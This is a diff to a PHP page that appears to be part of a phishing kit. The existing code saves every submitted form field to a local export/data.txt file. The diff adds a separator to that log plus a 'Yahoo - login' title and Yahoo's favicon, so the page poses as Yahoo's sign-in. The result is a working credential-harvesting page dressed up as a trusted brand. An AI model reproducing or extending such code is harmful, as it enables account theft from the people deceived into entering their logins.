@@ -26,6 +26,7 @@ $path = substr($path,0,17);
 $file = $path ."/export/data.txt";
 
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
 
 ?>
 
@@ -34,6 +35,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 <html>
 <head>
+
+<title>Yahoo - login</title>
+
+<link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
+
 </head>
 <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
